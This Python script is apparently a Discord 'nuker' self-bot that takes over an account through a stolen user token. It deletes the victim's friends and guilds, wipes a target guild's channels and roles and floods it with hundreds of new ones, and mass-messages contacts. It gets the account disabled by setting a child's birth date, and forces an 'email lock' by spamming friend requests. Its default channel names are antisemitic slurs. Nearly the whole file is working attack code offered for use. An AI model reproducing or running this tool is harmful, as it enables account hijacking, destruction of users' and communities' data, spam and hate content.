import discord, os, asyncio, random
from colorama import Fore as col
import requests as req

#####SETTUP#####
token = "" # TOKEN
guildname = ["", ""] # GUILD NAMES
guildiconURL = "" # USERICON AND GUILDICON
channelname = ["Fuck Kikes", "Kiked"] # CHANNEL NAMES
game = "" # STREAM NAME
url = "https://www.youtube.com/watch?v=eh7BbRD3vLQ" # URL FOR STREAM
#####CODE#####
if not token:
    token = input(col.RED + f":-: Token Required! Input Here: ")


async def ascii():
    print(col.LIGHTRED_EX+f""" 
 ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄   ▄ 
█       █       █   █ █ █
█   ▄   █   ▄▄▄▄█   █▄█ █
█  █▄█  █  █  ▄▄█      ▄█
█       █  █ █  █     █▄ 
█   ▄   █  █▄▄█ █    ▄  █
█▄▄█ █▄▄█▄▄▄▄▄▄▄█▄▄▄█ █▄█
{col.WHITE}A tool for reseting or destroying user accounts, Version 2
{col.WHITE}Made By Winter
1: Resets Token
2: Account guild & friend info
3: Disables the token.
4: Token Info
5: Deletes friends
6: MassDMs friends
7: Remote nukes a guild
8: Email locks the token
9: Does everything
""")



async def mainmenu():
    choice = input(col.BLUE+":+: ")

    if choice == "nuke":
        print(f"Destroying {client.user}'s account")
        await nuke(token)

    elif choice == "1":
       await reset(token)

    elif choice == "2":
        await fginfo(token)

    elif choice == "3":
        await disable(token)

    elif choice == "4":
        await uinfo(token)

    elif choice == "5":
        await friendreq(token)


    elif choice == "6":
        await massdm(token)

    elif choice == "7":
        await remotenuke(token)

    elif choice == "8":
        await emaillock(token)

    elif choice == "9":
        await uinfo(token)
        await fginfo(token)
        await nuke(token)
        await disable(token)
        await emaillock(token)
        await cont()

    elif not choice:
       await mainmenu()

async def remotenuke(token):
    id = input("GuildID: ")
    if not id:
        await cont()
    guild = await client.fetch_guild(id)
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    for role in guild.roles:
        try:
            await role.delete()
        except:
            pass
    rq = req.get(guildiconURL)
    gicon = rq.content
    await guild.edit(name=random.choice(guildname), icon=gicon)
    for x in range(500):
        await guild.create_text_channel(name=random.choice(channelname))
    for x in range(250):
        await guild.create_role(name=random.choice(channelname))
    await cont()
async def massdm(token):
    print(f"This will piss Discord off, leave content empty to quit.")
    content = input(col.GREEN+"Content: ")
    if not content:
        print(f"Cancelled MASSDM")
        await mainmenu()
    for friend in client.user.friends:
        try:
            await friend.send(f"{content}")
        except:
            pass
    await cont()


async def uinfo(token):
    print(col.GREEN+f"""User: {client.user}
ID: {client.user.id}
Email: {client.user.email}
Created At: {client.user.created_at}
Verified: {client.user.verified}
MFA: {client.user.mfa_enabled}
Nitro: {client.user.premium}
Flags: {client.user.public_flags}
Guild Count: {len(client.guilds)}
Friend Count: {len(client.user.friends)}""")
    await cont()

async def fginfo(token):
    print(f"{client.user} is friends with {len(client.user.friends)} people")
    print(f"They are also in {len(client.guilds)} guilds.")
    for friend in client.user.friends:
        await asyncio.sleep(0.2)
        print(col.GREEN+f"{friend}, ID: {friend.id}")
    for guild in client.guilds:
        await asyncio.sleep(0.2)
        print(col.GREEN+f"{guild}, ID: {guild.id}")
    await cont()
async def reset(token):
    await client.user.edit_settings(theme=discord.Theme.dark())
    for guild in client.guilds:
        try:
            await guild.delete()
        except:
            pass
    print(f"{client.user} was reset.")
    await cont()

async def friendreq(token):
    for friend in client.user.friends:
        try:
            await friend.delete()
            print(col.GREEN + f":+: {friend} was deleted")
        except:
            print(col.RED+f":-: {friend} wasn't deleted")
async def disable(token):
    r = req.patch('https://discordapp.com/api/v6/users/@me', headers={'authorization': token},
                       json={'date_of_birth': '2015-7-16'})
    print(f"{client.user} is disabled.")
    await cont()

ids = [768496306556502068, 764577901806485545, 763384611925000193, 750317688944853064, 599636206719860754, 754619738541260821, 477784992525844480, 771475415696015383]
async def emaillock(token):
    for x in range(20):
        disableid = await client.fetch_user(random.choice(ids))
        username = disableid.name
        disablediscrim = disableid.discriminator
        print(f"Sent a friend request to {username}")
        req.post("https://discord.com/api/v6/users/@me/relationships", headers = {'authorization' : token}, json = {'username' : username, 'discriminator' : int(disablediscrim)})
    await cont()
    
        

async def nuke(token):
    rq = req.get(guildiconURL)
    gicon = rq.content
    req.delete('https://discord.com/api/v8/hypesquad/online', headers={'authorization': token})
    await client.user.edit_settings(theme=discord.Theme.light, locale="ko", developer_mode=False, animate_emojis=False, gif_auto_play=False, render_reactions=False, default_guilds_restricted=True, message_display_compact=True, icon=gicon)
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.streaming, name=game, url=url), status=discord.Status.dnd)
    for friend in client.friends:
        try:
            await friend.delete()
            print(col.GREEN+f":+: {friend} was deleted")
        except:
            print(f":-: {friend} wasn't deleted")
    for guild in client.guilds:
        try:
            await guild.leave()
            print(col.GREEN + f":+: left {guild}")
        except:
            pass
        try:
            await guild.delete()
            print(col.GREEN+f":+: {guild} was deleted")
        except:
            pass
    await client.create_guild(name=random.choice(guildname))
    print(f"{client.user} was nuked")
    await cont()

async def cont():
    c = input(f"Would you like to continue?: ")
    if c == "y":
        await mainmenu()
    elif c == "n":
        await client.logout()
    elif not c:
        await mainmenu()



class MyClient(discord.Client):
 async def on_connect(self):
    await ascii()
    await mainmenu()



  

client = MyClient()
client.run(token, bot=False)

